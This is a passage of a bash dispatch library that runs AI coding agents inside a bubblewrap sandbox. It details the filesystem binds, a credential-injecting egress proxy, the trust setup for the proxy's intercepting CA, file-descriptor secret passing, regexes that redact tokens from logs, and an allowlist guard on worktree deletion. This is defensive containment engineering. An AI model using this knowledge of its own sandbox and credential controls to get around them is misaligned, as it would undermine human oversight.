        # short-circuit into "Not logged in" — the proxy overwrites the
        # Authorization header regardless of what the sandbox sent.
        #
        # CLAUDE_CODE_API_BASE_URL (2026-08-05 — anti-jour finding, sami-ratified):
        # ANTHROPIC_BASE_URL covers the Anthropic SDK's message API client, but
        # bundled `claude` v2.1.191 has INTERNAL code paths (auto-update check,
        # session bootstrap, OAuth handshake, telemetry) that hardcode
        # https://api.anthropic.com/... and honor a distinct CC-specific env
        # var — CLAUDE_CODE_API_BASE_URL — for their base URL override. Setting
        # this alongside ANTHROPIC_BASE_URL routes ALL CC-internal traffic
        # through the /anthropic-proxy/* reverse-proxy path where host-side
        # OAuth injection lives. Without it, those internal calls fall through
        # to HTTPS_PROXY CONNECT tunnels (carrying the sandbox placeholder key)
        # → Anthropic 401 / SDK stall → guardrail idle_timeout 300s → pilot
        # dies at Turns:1 with HEAD unchanged (n=6 dispatches observed).
        # Found via `strings` on bundled claude binary; verified end-to-end
        # in canary (opus-4-8, stream-json, no --bare) → 1.7s clean completion.
        # γ (MITM CONNECT tunnels) filed as long-term robustness follow-up so
        # we're not dependent on this internal env var indefinitely.
        net_setenv_args+=(
            --setenv ANTHROPIC_BASE_URL "http://127.0.0.1:$_PILOT_EGRESS_TCP_PORT/anthropic-proxy"
            --setenv CLAUDE_CODE_API_BASE_URL "http://127.0.0.1:$_PILOT_EGRESS_TCP_PORT/anthropic-proxy"
            --setenv ANTHROPIC_API_KEY "proxy-managed-no-secret"
            # γ trust for the helper CA (Vincent-authorized 2026-08-05).
            # NODE_EXTRA_CA_CERTS is ADDITIVE (adds to Node's built-in trust)
            # so bundled claude keeps trusting the system CA for anything else;
            # it covers our api.anthropic.com Node path.
            #
            # mika#2056: GitHub is now MITM'd too, and git / gh / curl / python
            # must trust the mitmproxy CA for github.com + api.github.com. Unlike
            # NODE_EXTRA_CA_CERTS those tools honour GIT_SSL_CAINFO /
            # SSL_CERT_FILE / CURL_CA_BUNDLE / REQUESTS_CA_BUNDLE, which REPLACE
            # the trust store. The old warning here — "do not set SSL_CERT_FILE,
            # it would break github.com verification" — is answered by pointing
            # them at a SUPERSET (system store + mitm CA) that the prologue
            # builds, so nothing loses system trust. Those exports live in
            # $_PILOT_SECRET_PROLOGUE (they depend on a file assembled inside the
            # sandbox), not here.
            --setenv NODE_EXTRA_CA_CERTS "$_PILOT_HELPER_CA_SANDBOX_PATH"
        )
        # sh -c wrapper that starts the shim, waits for it, execs the pilot,
        # cleans up on exit. `exec` in the final position ensures the pilot's
        # exit status becomes the sh's. $_PILOT_SECRET_PROLOGUE is prepended to
        # that script (mika#2039) so any bwrap-materialised secret files are
        # re-exported before anything else runs, and (mika#2056) so the combined
        # CA bundle is assembled and GIT_SSL_CAINFO / SSL_CERT_FILE et al. are
        # exported before the pilot's first `git push` / `gh` call.
        sandbox_entrypoint_prefix="/bin/sh"
    }

    local -a setenv_args=()
    local var
    for var in "${_PILOT_SANDBOX_ENV_ALLOWLIST[@]}"; do
        if [ -n "${!var:-}" ]; then
            setenv_args+=(--setenv "$var" "${!var}")
        fi
    done

    # mika#2039: secret channel. bwrap reads each value from a file descriptor
    # and materialises it as a 0600 read-only file inside the sandbox, so no
    # secret value ever enters the argv that /proc/<pid>/cmdline exposes.
    #
    # Two properties of this block are load-bearing:
    #
    #   1. xtrace is suppressed around it. `dispatch_claude_pilot` runs the
    #      whole dispatch under `set -x` with BASH_XTRACEFD pointed at
    #      $TRACE_FILE, and xtrace expands process substitutions — an
    #      unbracketed `printf` here writes `++ printf %s <token>` into that
    #      file, which _emit_callback tails back to the caller and whose
    #      NAME=value redaction does not match that line shape. Same bracket
    #      as _setup_gh_auth (mika#903), but the prior state is restored
    #      rather than force-enabled: this function also runs from contexts
    #      with no xtrace (the canary, the test suite).
    #
    #   2. the descriptor is allocated by bash (`{var}<`), not hardcoded.
    #      Bash guarantees a number >= 10, which structurally keeps the
    #      channel off fd 9 — already taken by BASH_XTRACEFD for the whole
    #      dispatch — and gives each secret its own descriptor with no
    #      arithmetic and no `eval`. The fd is inherited across exec into
    #      bwrap; it is closed again after the call returns.
    #
    # `printf` is the bash builtin. /usr/bin/printf would put the value back
    # into an argv, which is exactly the defect this closes.
    local -a secret_args=()
    local -a secret_fds=()
    local _sfd _xtrace_was_on=0
    case "$-" in *x*) _xtrace_was_on=1 ;; esac
    { set +x; } 2>/dev/null
    for var in "${_PILOT_SANDBOX_SECRET_ALLOWLIST[@]}"; do
        if [ -n "${!var:-}" ]; then
            unset _sfd
            exec {_sfd}< <(printf '%s' "${!var}")
            secret_args+=(--perms 0600 --ro-bind-data "$_sfd" "$_PILOT_SECRET_DIR_SANDBOX/$var")
            secret_fds+=("$_sfd")
        fi
    done
    if [ "$_xtrace_was_on" -eq 1 ]; then
        set -x
    fi
    # HOME bind property: EACH bind-in HOME must not carry any credential
    # or session token. Enforced by narrow subpaths per family — never bind
    # a whole family directory (~/.claude, ~/.local, ~/.mika) because those
    # roots hold .credentials.json / share/jupyter/*_secret /
    # share/uv/credentials/ / .env respectively. Adding a new bind requires
    # confirming its subtree carries no cred-shaped file (see
    # coherence audit 2026-08-04).
    local _sandbox_rc=0
    if [ -n "$sandbox_entrypoint_prefix" ]; then
        # Phase 2b mode: quote the original argv so the sh -c can re-exec it
        # verbatim. Uses `printf '%q'` for shell-safe re-quoting.
        local quoted_argv
        quoted_argv=$(printf ' %q' "$@")
        bwrap \
            --as-pid-1 \
            --unshare-user \
            --unshare-pid \
            --unshare-ipc \
            --unshare-uts \
            --unshare-cgroup \
            --new-session \
            --die-with-parent \
            --clearenv \
            --ro-bind /usr /usr \
            --ro-bind-try /lib /lib \
            --ro-bind-try /lib64 /lib64 \
            --ro-bind /bin /bin \
            --ro-bind-try /sbin /sbin \
            --ro-bind /etc /etc \
            --ro-bind-try /opt /opt \
            --dev /dev \
            --proc /proc \
            --tmpfs /tmp \
            --tmpfs /var/tmp \
            --tmpfs /run \
            --tmpfs /home \
            --bind "$WORKTREE_DIR" "$WORKTREE_DIR" \
            ${_PILOT_GITDIR_BIND_ARGS[@]+"${_PILOT_GITDIR_BIND_ARGS[@]}"} \
            --ro-bind "$_PILOT_GITCONFIG_HOST" "$_PILOT_GITCONFIG_SANDBOX" \
            --setenv GIT_CONFIG_GLOBAL "$_PILOT_GITCONFIG_SANDBOX" \
            --setenv GIT_CONFIG_NOSYSTEM "1" \
            --setenv GIT_TERMINAL_PROMPT "0" \
            --ro-bind-try "$HOME/.local/bin/claude-pilot" "$HOME/.local/bin/claude-pilot" \
            --ro-bind-try "$HOME/.local/share/uv/tools/claude-pilot" "$HOME/.local/share/uv/tools/claude-pilot" \
            --ro-bind-try "/data/workspace/mika-platform/claude-pilot/src" "/data/workspace/mika-platform/claude-pilot/src" \
            --ro-bind-try "$HOME/.claude/plugins" "$HOME/.claude/plugins" \
            --ro-bind-try "$HOME/.claude/settings.json" "$HOME/.claude/settings.json" \
            --ro-bind-try "$HOME/.claude/commands" "$HOME/.claude/commands" \
            --ro-bind-try "$HOME/.claude/hooks" "$HOME/.claude/hooks" \
            --ro-bind-try "$HOME/.nvm/versions" "$HOME/.nvm/versions" \
            --ro-bind-try "$HOME/.cargo/registry" "$HOME/.cargo/registry" \
            --ro-bind-try "$HOME/.cargo/config.toml" "$HOME/.cargo/config.toml" \
            --ro-bind-try "$HOME/.cargo/bin" "$HOME/.cargo/bin" \
            --ro-bind-try "$HOME/.rustup" "$HOME/.rustup" \
            --bind "$HOME/.mika/data/pilot-transcripts" "$HOME/.mika/data/pilot-transcripts" \
            ${_PILOT_LOG_BIND_ARGS[@]+"${_PILOT_LOG_BIND_ARGS[@]}"} \
            "${net_bwrap_args[@]}" \
            "${setenv_args[@]}" \
            "${net_setenv_args[@]}" \
            ${secret_args[@]+"${secret_args[@]}"} \
            --chdir "$WORKTREE_DIR" \
            -- "$sandbox_entrypoint_prefix" -c "
$_PILOT_SECRET_PROLOGUE
python3 '$_PILOT_EGRESS_PROXY_BIN' --sandbox-tcp $_PILOT_EGRESS_TCP_PORT --socket '$_PILOT_EGRESS_SOCK' >&2 &
_shim_pid=\$!
# Bounded wait for shim to listen (max ~1s).
_i=0
while [ \$_i -lt 20 ]; do
    if python3 -c 'import socket
s=socket.socket()
s.settimeout(0.1)
try:
    s.connect((\"127.0.0.1\", $_PILOT_EGRESS_TCP_PORT))
    s.close()
except Exception:
    exit(1)' 2>/dev/null; then
        break
    fi
    sleep 0.05
    _i=\$((_i + 1))
done
trap 'kill \$_shim_pid 2>/dev/null' EXIT
$quoted_argv
" || _sandbox_rc=$?
    else
        # Phase 2a fallback: fs cut only, network unrestricted.
        #
        # The `/bin/sh -c` entrypoint at the end of this block exists to run
        # $_PILOT_SECRET_PROLOGUE before the pilot (mika#2039 secret-file
        # re-export + mika#2056 CA-bundle assembly). The original argv rides
        # through as positional parameters, so no second `printf '%q'` quoting
        # layer is introduced, and `exec` in final position keeps the pilot's
        # argv, pid and exit status identical to the bare `-- "$@"` this
        # replaced. Reverting it to `-- "$@"` looks like a simplification and
        # silently drops the prologue. (Phase 2a has no egress proxy, so GitHub
        # auth injection is inactive here — the pilot reaches GitHub tokenless,
        # fail-closed; this is the degraded fallback, same as Anthropic.)
        bwrap \
            --as-pid-1 \
            --unshare-user \
            --unshare-pid \
            --unshare-ipc \
            --unshare-uts \
            --unshare-cgroup \
            --new-session \
            --die-with-parent \
            --clearenv \
            --ro-bind /usr /usr \
            --ro-bind-try /lib /lib \
            --ro-bind-try /lib64 /lib64 \
            --ro-bind /bin /bin \
            --ro-bind-try /sbin /sbin \
            --ro-bind /etc /etc \
            --ro-bind-try /opt /opt \
            --dev /dev \
            --proc /proc \
            --tmpfs /tmp \
            --tmpfs /var/tmp \
            --tmpfs /run \
            --tmpfs /home \
            --bind "$WORKTREE_DIR" "$WORKTREE_DIR" \
            ${_PILOT_GITDIR_BIND_ARGS[@]+"${_PILOT_GITDIR_BIND_ARGS[@]}"} \
            --ro-bind "$_PILOT_GITCONFIG_HOST" "$_PILOT_GITCONFIG_SANDBOX" \
            --setenv GIT_CONFIG_GLOBAL "$_PILOT_GITCONFIG_SANDBOX" \
            --setenv GIT_CONFIG_NOSYSTEM "1" \
            --setenv GIT_TERMINAL_PROMPT "0" \
            --ro-bind-try "$HOME/.local/bin/claude-pilot" "$HOME/.local/bin/claude-pilot" \
            --ro-bind-try "$HOME/.local/share/uv/tools/claude-pilot" "$HOME/.local/share/uv/tools/claude-pilot" \
            --ro-bind-try "/data/workspace/mika-platform/claude-pilot/src" "/data/workspace/mika-platform/claude-pilot/src" \
            --ro-bind-try "$HOME/.claude/plugins" "$HOME/.claude/plugins" \
            --ro-bind-try "$HOME/.claude/settings.json" "$HOME/.claude/settings.json" \
            --ro-bind-try "$HOME/.claude/commands" "$HOME/.claude/commands" \
            --ro-bind-try "$HOME/.claude/hooks" "$HOME/.claude/hooks" \
            --ro-bind-try "$HOME/.nvm/versions" "$HOME/.nvm/versions" \
            --ro-bind-try "$HOME/.cargo/registry" "$HOME/.cargo/registry" \
            --ro-bind-try "$HOME/.cargo/config.toml" "$HOME/.cargo/config.toml" \
            --ro-bind-try "$HOME/.cargo/bin" "$HOME/.cargo/bin" \
            --ro-bind-try "$HOME/.rustup" "$HOME/.rustup" \
            --bind "$HOME/.mika/data/pilot-transcripts" "$HOME/.mika/data/pilot-transcripts" \
            ${_PILOT_LOG_BIND_ARGS[@]+"${_PILOT_LOG_BIND_ARGS[@]}"} \
            "${setenv_args[@]}" \
            ${secret_args[@]+"${secret_args[@]}"} \
            --chdir "$WORKTREE_DIR" \
            -- /bin/sh -c "$_PILOT_SECRET_PROLOGUE
exec \"\$@\"" mika-pilot-sandbox "$@" || _sandbox_rc=$?
    fi

    # mika#2039: close the secret descriptors, then return the status bwrap
    # actually produced. The order matters — closing first would overwrite
    # `$?` and break the invariant that the pilot's exit status is this
    # function's exit status.
    local _cfd
    for _cfd in ${secret_fds[@]+"${secret_fds[@]}"}; do
        exec {_cfd}<&-
    done
    return "$_sandbox_rc"
}

# --- mika#2121 (U1): the callback always names its PR state ------------------
# Before mika#2121 the three PR-emission sites communicated "no PR" by the
# ABSENCE of a `PR:` line. Four distinct states — no PR on the branch, the `gh`
# query itself failed, $REPO unset, $BRANCH unset — all produced identical
# silence, and the reaper (task_engine/engine.rs) could only write the generic
# `callback_delivered_without_pr_url` motif. That motif is exact on the symptom
# and mute on the cause: 306 parent tasks failed with it and nothing could tell
# a dead pilot from a `gh` outage. These helpers make the contract TOTAL —
# every delivered callback carries exactly one `PR:` or `NO_PR: <reason>` line.

# Classify why a `gh pr list` branch query yielded no PR URL. Pure function.
# Args: $1 repo  $2 branch  $3 gh-exit-code (0 = query ran clean, non-zero = failed)
# Echoes exactly one reason token:
#   repo_unset | branch_unset | gh_query_failed | no_pr_on_branch
# Order matters: an unset repo/branch is diagnosed before the exit code, because
# a query that never had a target to run against tells us nothing about `gh`.
_classify_no_pr_reason() {
    if [ -z "${1:-}" ]; then echo "repo_unset"; return 0; fi
    if [ -z "${2:-}" ]; then echo "branch_unset"; return 0; fi
    if [ "${3:-0}" -ne 0 ]; then echo "gh_query_failed"; return 0; fi
    echo "no_pr_on_branch"
}

# Run `gh pr list` for a branch and echo the PR URL (empty when none). The gh
# exit code is preserved in the global $_LAST_PR_QUERY_RC for _classify_no_pr_reason,
# and on a genuine query failure the (secret-scrubbed) gh stderr is forwarded to
# fd 2 rather than swallowed — the mika#2121 point is that a `gh` outage stops
# being indistinguishable from "no PR on the branch". Sites 1 & 2 (both use
# `gh pr list`) share this; site 3 is a `gh pr create` and is handled inline.
_LAST_PR_QUERY_RC=0
_pr_list_url() {
    local _repo="$1" _branch="$2" _err _url
    _err=$(mktemp "${TMPDIR:-/tmp}/mika-pr-query-err.XXXXXX" 2>/dev/null || echo /dev/null)
    _url=$(gh pr list --repo "senara-solutions/$_repo" --head "$_branch" --json url --jq '.[0].url' 2>"$_err")
    _LAST_PR_QUERY_RC=$?
    if [ "$_LAST_PR_QUERY_RC" -ne 0 ] && [ -s "$_err" ]; then
        echo "dispatch-lib: gh pr list failed (rc=$_LAST_PR_QUERY_RC) for ${_repo} head=${_branch}: $(_scrub_secrets_from_output < "$_err" | tr '\n' ' ' | tail -c 500)" >&2
    fi
    [ "$_err" != /dev/null ] && rm -f "$_err"
    printf '%s' "$_url"
}

# Append exactly one canonical PR-status line to RESULT, stripping any prior
# line-anchored `PR:`/`NO_PR:` first. This keeps the total-output contract true
# BY CONSTRUCTION even when two sites run on one delivery path — site 2 finds no
# PR and writes `NO_PR:`, then the site-3 rescue opens one and writes `PR:`; the
# strip guarantees the delivered callback carries the later, truer line alone
# (never both). $1 is the full line body, e.g. "PR: <url>" or "NO_PR: <reason>".
_set_pr_status_line() {
    RESULT="$(printf '%s' "$RESULT" | sed '/^PR: /d; /^NO_PR: /d')
${1}"
}

# mika#2492 — the sister of the above, for the `Outcome:` line.
#
# Deliberately NOT a reuse of `_set_pr_status_line`: that one knows only
# `PR:`/`NO_PR:` and has never touched `Outcome:`. This one strips any prior
# line-anchored `Outcome:` and appends, which makes the "exactly one `Outcome:`
# line" contract true BY CONSTRUCTION rather than by coincidence of ordering —
# the same property the comment above claims for its elder.
#
# The window it exists for: `_post_flight_recovery` poses an `Outcome:` while
# still inside `_run_claude_pilot` (mika#940 Unit 3), and Path B may later open
# a PR that makes a truer one available. $1 is the full line body, e.g.
# "Outcome: PR_OPENED — <url>".
_set_outcome_line() {
    local _body
    _body="$(printf '%s' "$RESULT" | sed '/^Outcome: /d')"
    # Trim trailing newlines so the appended block always reads as exactly one
    # blank separator, whatever the stripped line left behind.
    while [ "${_body%$'\n'}" != "$_body" ]; do _body="${_body%$'\n'}"; done
    RESULT="${_body}

${1}"
}

# mika#749: TERM trap writes cancel discriminator before exit.
# Convention: reason file at /tmp/mika-cancel-reason-$$ (PID-based).
# cancel_task pre-writes CANCELLED_BY_OPERATOR before SIGTERM; this trap
# writes CANCELLED_BY_SIGNAL only if no reason file exists yet (the "if
# not exists" check ensures operator pre-write wins the race).
_dispatch_lib_term_trap() {
    if [ ! -e "/tmp/mika-cancel-reason-$$" ]; then
        echo "STATUS=CANCELLED_BY_SIGNAL" > "/tmp/mika-cancel-reason-$$" 2>/dev/null || true
    fi
    exit 143
}

_dispatch_lib_exit_trap() {
    _EXIT_CODE=$?
    # mika#2155: crash/cancel backstop for the claim — the nominal path already
    # released in _deliver_callback (and lowered the flag, so this is a no-op
    # there). Before the CALLBACK_SENT guard on purpose: the nominal path
    # returns early there, and a failed nominal release still needs this retry.
    _release_issue_seat "$REPO" "$ISSUE_NUM" || true
    # Cleanup fuzzy-match side-channel tmpfile (mika#1272)
    rm -f "${_DISPOSITION_FUZZY_FILE:-}" 2>/dev/null
    # Cleanup architect-stderr side-channel tmpfile (mika#2278)
    rm -f "${_ARCH_ASK_STDERR_FILE:-}" 2>/dev/null
    # Guard: skip if already delivered or no task ID
    [ "$CALLBACK_SENT" -eq 1 ] && { [ -n "$STDOUT_FILE" ] && rm -f "$STDOUT_FILE"; [ -n "$STDERR_FILE" ] && rm -f "$STDERR_FILE"; rm -f "$TRACE_FILE"; return; }
    [ -z "$TASK_ID" ] && { [ -n "$STDOUT_FILE" ] && rm -f "$STDOUT_FILE"; [ -n "$STDERR_FILE" ] && rm -f "$STDERR_FILE"; rm -f "$TRACE_FILE"; return; }
    # Try to recover result from stdout file if RESULT was never populated.
    if [ -z "$RESULT" ] && [ -n "$STDOUT_FILE" ] && [ -f "$STDOUT_FILE" ]; then
        _RECOVERED_RAW=$(cat "$STDOUT_FILE" 2>/dev/null)
        # Issue #135: extract first JSON line from possible preamble (dotenvx banner)
        _RECOVERED=$(printf '%s\n' "$_RECOVERED_RAW" | grep -m1 '^{' || true)
        : "${_RECOVERED:=$_RECOVERED_RAW}"
        _STATUS=$(printf '%s\n' "$_RECOVERED" | jq -r '.status // empty' 2>/dev/null)
        if [ -n "$_STATUS" ]; then
            RESULT="claude-pilot completed (status: ${_STATUS}, recovered from crash).
Exit code: ${_EXIT_CODE}
Stdout recovered from file."
        fi
    fi
    # Capture stderr tail on crash path BEFORE deleting the file (#104)
    # Scrub secrets from stderr to prevent PAT leakage in callback delivery (mika#903).
    if [ -z "$RESULT" ] && [ -n "$STDERR_FILE" ] && [ -f "$STDERR_FILE" ]; then
        _STDERR_TAIL=$(tail -c 10000 "$STDERR_FILE" 2>/dev/null | _scrub_secrets_from_output)
        if [ -n "$_STDERR_TAIL" ]; then
            RESULT="HANDLER CRASH (exit code ${_EXIT_CODE}). Script failed before building result.

Stderr (last 10KB):
${_STDERR_TAIL}"
        fi
    fi
    # Clean up temp files AFTER capture
    [ -n "$STDOUT_FILE" ] && rm -f "$STDOUT_FILE"
    [ -n "$STDERR_FILE" ] && rm -f "$STDERR_FILE"
    if [ -z "$RESULT" ]; then
        RESULT="HANDLER CRASH (exit code ${_EXIT_CODE}). Script failed before building result."
    fi
    # --- Diagnostic trace tail (mika#887) ---
    # Scrub secrets from trace tail to prevent PAT leakage in callback delivery (mika#903).
    if [ -f "$TRACE_FILE" ]; then
        case "$RESULT" in
            "HANDLER CRASH"*)
                # Crash path: append trace tail, preserve file for forensics
                _TRACE_TAIL=$(tail -50 "$TRACE_FILE" 2>/dev/null \
                    | _scrub_secrets_from_output \
                    | sed 's/^/    /')
                if [ -n "$_TRACE_TAIL" ]; then
                    RESULT="${RESULT}

Trace tail (last 50 lines):
${_TRACE_TAIL}"
                fi
                ;;
            *)
                # Success/recovery path: clean up trace file
                rm -f "$TRACE_FILE"
                ;;
        esac
    fi
    # Issue #138: best-effort PR URL discovery on crash recovery path.
    # mika#2121 (U1): even the crash path now names its PR state. An else on both
    # guards means a crash callback carries `NO_PR: <reason>` instead of silence,
    # so the reaper can tell a crashed-with-no-PR run from a `gh` outage.
    if [ -n "$REPO" ] && [ -n "$BRANCH" ]; then
        _PR_URL=$(_pr_list_url "$REPO" "$BRANCH")
        if [ -n "$_PR_URL" ]; then
            # mika#2026: stamp origin on the artefact itself. Fail-open — a
            # missing marker costs an `unknown` row in the report, never a dispatch.
            _stamp_pr_origin "$REPO" "$_PR_URL" loop || true
            _set_pr_status_line "PR: ${_PR_URL}"
        else
            _set_pr_status_line "NO_PR: $(_classify_no_pr_reason "$REPO" "$BRANCH" "$_LAST_PR_QUERY_RC")"
        fi
    else
        _set_pr_status_line "NO_PR: $(_classify_no_pr_reason "$REPO" "$BRANCH" 0)"
    fi
    # mika#1996: this trap delivers its own callback instead of calling
    # _deliver_callback, so the gate has to be applied here too — otherwise the
    # crash path is a hole in a control that only counts if it has none. It runs
    # AFTER the PR discovery above (whose `PR:` line is production evidence) and
    # BEFORE the cancel prefix below, which must stay the first line the mika-dev
    # parser sees. Same rule as in _deliver_callback: delivery outranks measurement.
    _gate_non_empty_cycle || echo "cycle_output.gate_error: the non-empty-output gate failed (rc=$?) — delivering the crash callback unchanged" >&2

    # --- Cancel discriminator envelope prefix (mika#749) ---
    # Read the reason file written by cancel_task (CANCELLED_BY_OPERATOR) or
    # the TERM trap (CANCELLED_BY_SIGNAL). Prefix the RESULT so the consumer
    # (mika-dev callback parser) sees the STATUS= line first.
    _CANCEL_REASON=""
    if [ -f "/tmp/mika-cancel-reason-$$" ]; then
        _CANCEL_REASON=$(cat "/tmp/mika-cancel-reason-$$" 2>/dev/null || true)
        rm -f "/tmp/mika-cancel-reason-$$" 2>/dev/null || true
    fi
    if [ -n "$_CANCEL_REASON" ]; then
        RESULT="${_CANCEL_REASON}

Original exit code: ${_EXIT_CODE}
${RESULT}"
    fi

    RESULT=$(printf '%s' "$RESULT" | head -c 92000)
    set +e
    if [ -n "$AGENT" ]; then
        mika ask --task-id "$TASK_ID" --task-complete --agent "$AGENT" -- "$RESULT"
    else
        mika ask --task-id "$TASK_ID" --task-complete -- "$RESULT"
    fi
    CALLBACK_SENT=1
    set -e
}

_parse_input_json() {
    # Read input JSON from stdin
    INPUT=$(cat)

    # Parse callback fields injected by the long-running executor
    TASK_ID=$(printf '%s\n' "$INPUT" | jq -r '.__mika_task_id // empty')
    AGENT=$(printf '%s\n' "$INPUT" | jq -r '.__mika_agent // empty')

    if [ -z "$TASK_ID" ]; then
        echo "Error: no __mika_task_id in input (not running as long-running handler?)" >&2
        exit 1
    fi

    # Parse user-provided fields
    SKILL=$(printf '%s\n' "$INPUT" | jq -r '.skill // empty')
    PROMPT=$(printf '%s\n' "$INPUT" | jq -r '.prompt // empty')
    USER_TASK_ID=$(printf '%s\n' "$INPUT" | jq -r '.task_id // empty')
    DRY_RUN=$(printf '%s\n' "$INPUT" | jq -r '.dry_run // empty')
    ITERATION_CTX=$(printf '%s\n' "$INPUT" | jq -r '.iteration_context // empty')
}

_validate_inputs() {
    # Structured validation errors (#955): emit parseable JSON to stderr so that
    # the exit trap delivers an actionable error (not a generic crash string).
    # Downstream consumers (mika-dev's callback turn) can `jq` the result to
    # distinguish "LLM forgot a required field" (retry-safe) from "handler bug" (escalate).
    if [ -z "$SKILL" ]; then
        printf 'DISPATCH_VALIDATION_ERROR: {"error":"missing_required_field","field":"skill","valid_values":["dev-pilot","dev-groom"],"reason":"The skill field is required but was not provided in the tool call."}\n' >&2
        exit 1
    fi

    # Skill validation is handled by the case switch in dispatch_claude_pilot
    # which derives ENTRY_COMMAND from SKILL. Unknown skills exit 1 there.

    if [ -z "$PROMPT" ]; then
        printf 'DISPATCH_VALIDATION_ERROR: {"error":"missing_required_field","field":"prompt","reason":"The prompt field is required but was not provided in the tool call."}\n' >&2
        exit 1
    fi

    if [ -z "$USER_TASK_ID" ]; then
        printf 'DISPATCH_VALIDATION_ERROR: {"error":"missing_required_field","field":"task_id","reason":"The task_id field is required but was not provided in the tool call."}\n' >&2
        exit 1
    fi

    # Reject non-UUID task_id at the handler boundary (#958)
    if ! grep -qiE -- '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$' <<<"$USER_TASK_ID"; then
        # Sanitize value for JSON safety: escape backslashes and double-quotes.
        _sanitized_tid=$(printf '%s' "$USER_TASK_ID" | sed 's/\\/\\\\/g; s/"/\\"/g' | head -c 200)
        printf 'DISPATCH_VALIDATION_ERROR: {"error":"invalid_uuid","field":"task_id","value":"%s","reason":"task_id must be a valid UUID (36-char format like 15383984-a3e7-41bf-ac6f-630ba9a89d63). Got a non-UUID string — this is likely an unsubstituted template placeholder."}\n' "$_sanitized_tid" >&2
        exit 1
    fi
}

_scrub_secrets_from_output() {
    # Redact known secret patterns from diagnostic output before callback delivery (mika#903).
    # Covers: env var assignments (GH_APP_TOKEN=..., MIKA_*=..., GH_TOKEN=...),
    #         fine-grained PATs (github_pat_*), classic PATs (ghp_*),
    #         GitHub App installation tokens (ghs_*), and user-to-server OAuth tokens (ghu_*).
    sed -E 's/(GH_APP_TOKEN|GH_TOKEN|MIKA_[A-Z_]*TOKEN|MIKA_[A-Z_]*API_KEY|MIKA_[A-Z_]*PRIVATE_KEY)=[^ ]*/\1=<REDACTED>/g' \
        | sed -E 's/github_pat_[A-Za-z0-9_]+/<REDACTED_PAT>/g' \
        | sed -E 's/gh[spu]_[A-Za-z0-9_]+/<REDACTED_TOKEN>/g'
}


_setup_gh_auth() {
    # Suppress xtrace to prevent PAT from appearing in trace logs (mika#903).
    { set +x; } 2>/dev/null
    # GitHub App installation token for gh CLI.
    # See mika#520 for context on why we check GH_TOKEN before calling gh auth login.
    if [ -z "${GH_TOKEN:-}" ]; then
        GH_APP_TOKEN=$(mika ${AGENT:+--agent "$AGENT"} token github 2>/dev/null)
        if [ -n "$GH_APP_TOKEN" ]; then
            echo "$GH_APP_TOKEN" | gh auth login --with-token 2>/dev/null
            unset GH_APP_TOKEN
            gh auth switch --user "mika-platform-bot[bot]" 2>/dev/null || true
        else
            echo "WARNING: mika token github failed — gh CLI will fall back to host credentials" >&2
        fi
    fi
    # Re-enable xtrace (was set by dispatch_claude_pilot before calling us).
    # GH_APP_TOKEN is already unset above, so set -x won't leak it.
    set -x
}

_scrub_env() {
    unset MIKA_ANTHROPIC_API_KEY MIKA_INTERNAL_TOKEN MIKA_OPENAI_API_KEY MIKA_BRAVE_API_KEY
}

# ---------------------------------------------------------------------------
# mika#1943 — un chemin qu'on ne peut pas PROUVER worktree n'est pas supprimé
# ---------------------------------------------------------------------------
#
# L'incident du 28/07 : un nettoyage automatisé a emporté `/data/workspace/bbytaa`,
# un répertoire qui n'était protégé par aucune liste — il était protégé par les
# instantanés btrbk qui l'encadraient. Le ticket prescrivait une **denylist**
# (`^/data/workspace/[^/]+/?$` refusé). Ce qui est livré ici est l'inverse, et
# strictement plus fort : une **allowlist positive**, alignée terme pour terme sur
# `worktree_reaper::is_managed_worktree_path` (mika#2420, `crates/mika-agent/src/`).
#
# Trois raisons, dont la troisième décide :
#
#   1. Une denylist est fausse le jour où un répertoire précieux n'y figure pas —
#      c'est-à-dire le jour où elle servirait. `/data/workspace/bbytaa` n'aurait
#      été dans aucune liste écrite avant lui.
#   2. Deux sémantiques opposées pour une même question dans un même dépôt est la
#      divergence programmée que `grooming_marker` (mika#2158) a dû fermer une
#      fois : deux prédicats répondant différemment à « ce chemin est-il
#      supprimable ». Le reaper décide par allowlist ; cette garde aussi.
#   3. `/data/workspace/` est le disque de cette machine, pas une propriété du
#      système. Coder ce préfixe en dur ne protégerait que gentux et serait muet
#      partout ailleurs — un garde-fou qui *paraît* poser une règle générale.
#      `/.claude/worktrees/` est, lui, une propriété structurelle du layout.
#
# L'asymétrie qui décide du fail-safe, écrite avant le reste : un faux négatif
# laisse un worktree résiduel sur le disque — le reaper mika#2420 le ramasse au
# tick suivant, ou l'opérateur ; coût borné, quelques Go, temporaire. Un faux
# positif supprime un répertoire qui n'est pas un worktree : irréversible, et
# c'est l'incident du 28/07. **Donc tout terme illisible conserve**, exactement
# comme le reaper, délibérément, pour que les deux gardes ne puissent pas se
# contredire.
#
# Une fonction, et pas une garde recopiée à chaque site : il y a cinq sites
# destructifs dans ce fichier, donc cinq occasions de diverger.
#
# Les marqueurs `# mika1943:T<n>` en fin de ligne ne sont pas décoratifs : la
# suite de tests neutralise **un** terme à la fois par `sed` et vérifie que le
# refus correspondant disparaît. Renommer un marqueur ou fusionner deux termes
# fait rougir `MUTATION_ABSENTE` plutôt que de désarmer la vérification en
# silence. Une conjonction ne se teste pas en désarmant tous ses termes ensemble
# (leçon mika#2277).
_MIKA_MANAGED_WORKTREE_SEGMENT='/.claude/worktrees/'

# Émetteur du refus. Séparé de la décision : celle-ci a un lecteur unique, mais
# dire le refus n'est pas décider. Sans cette ligne, un refus se lirait
# exactement comme une absence de travail (classe mika#2205).
_refuse_unsafe_removal() {
    echo "dispatch_lib_unsafe_removal_refused: site=$1 term=$3 path='$2' (mika#1943)" >&2
}

# Args: $1 = chemin candidat, $2 = nom du site appelant (pour le diagnostic).
# Rend 0 si le chemin est un worktree géré supprimable, non-zéro sinon.
_assert_removable_worktree_path() {
    local path="${1-}" site="${2:-unknown}"
    case "$path" in "") _refuse_unsafe_removal "$site" "$path" empty; return 1 ;; esac                                            # mika1943:T1
    case "$path" in /*) : ;; *) _refuse_unsafe_removal "$site" "$path" not_absolute; return 1 ;; esac                             # mika1943:T2
    case "$path" in */../*|*/..) _refuse_unsafe_removal "$site" "$path" parent_dir_component; return 1 ;; esac                    # mika1943:T3
    case "$path" in *"$_MIKA_MANAGED_WORKTREE_SEGMENT"*) : ;; *) _refuse_unsafe_removal "$site" "$path" outside_managed_root; return 1 ;; esac  # mika1943:T4
    return 0
}

# mika#1414: Pre-rebase worktree cleanup for the resume path.
#
# On a resume dispatch _set_up_worktree() reuses an existing worktree, then
